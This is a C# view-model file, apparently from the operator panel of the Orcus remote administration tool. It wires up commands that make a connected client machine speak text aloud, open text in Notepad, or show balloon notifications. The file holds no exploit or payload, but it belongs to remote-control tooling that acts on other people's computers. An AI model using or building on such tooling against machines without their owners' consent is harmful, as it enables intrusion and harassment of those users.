using System;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.UserInteraction;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.UserInteraction;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class UserInteractionViewModel : CommandView
    {
        private bool _isInitialized;
        private RelayCommand _openBalloonToolTipCommand;
        private RelayCommand _openTextInNotepadCommand;
        private List<SpeechVoice> _speechVoices;
        private RelayCommand _textToSpeechCommand;
        private UserInteractionCommand _userInteractionCommand;

        public override string Name { get; } = (string) Application.Current.Resources["UserInteraction"];
        public override Category Category { get; } = Category.Utilities;

        public bool IsInitialized
        {
            get { return _isInitialized; }
            set { SetProperty(value, ref _isInitialized); }
        }

        public List<SpeechVoice> SpeechVoices
        {
            get { return _speechVoices; }
            set { SetProperty(value, ref _speechVoices); }
        }

        public RelayCommand TextToSpeechCommand
        {
            get
            {
                return _textToSpeechCommand ?? (_textToSpeechCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var text = (string) parameters[0];
                    var voice = (SpeechVoice) parameters[1];
                    var speed = (sbyte) (double) parameters[2];
                    var volume = (int) (double) parameters[3];
                    _userInteractionCommand.TextToSpeech(text, voice.Name, speed, volume);
                }));
            }
        }

        public RelayCommand OpenTextInNotepadCommand
        {
            get
            {
                return _openTextInNotepadCommand ?? (_openTextInNotepadCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var title = (string) parameters[0];
                    var text = (string) parameters[1];
                    if (string.IsNullOrEmpty(title) || string.IsNullOrEmpty(text))
                        return;

                    _userInteractionCommand.OpenInEditor(text, title);
                }));
            }
        }

        public RelayCommand OpenBalloonToolTipCommand
        {
            get
            {
                return _openBalloonToolTipCommand ?? (_openBalloonToolTipCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var icon = (NotifyToolTipIcon) parameters[0];
                    var title = (string) parameters[1];
                    var text = (string) parameters[2];
                    var timeout = (int) (double) parameters[3];

                    _userInteractionCommand.NotifyMessage(timeout, title, text, icon);
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _userInteractionCommand = clientController.Commander.GetCommand<UserInteractionCommand>();
            _userInteractionCommand.Initialized += _userInteractionCommand_Initialized;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/feedbacktoolicon.ico", UriKind.Absolute));
        }

        public override void LoadView(bool loadData)
        {
            _userInteractionCommand.Initialize();
        }

        private void _userInteractionCommand_Initialized(object sender, UserInteractionWelcomePackage e)
        {
            SpeechVoices = e.Voices;
            IsInitialized = true;
        }
    }
}